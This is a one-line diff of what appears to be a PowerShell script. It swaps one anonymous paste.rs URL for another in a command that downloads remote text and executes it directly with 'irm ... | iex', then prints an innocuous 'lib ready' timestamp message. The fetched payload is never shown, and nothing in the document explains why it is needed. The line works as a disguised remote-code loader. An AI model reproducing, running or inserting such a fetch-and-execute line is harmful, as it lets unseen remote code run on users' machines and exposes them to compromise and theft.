@@ -1,1 +1,1 @@
-irm https://paste.rs/N4hDR|iex; "lib ready " + (Get-Date -f HH:mm:ss)
+irm https://paste.rs/8Vroz|iex; "lib ready " + (Get-Date -f HH:mm:ss)
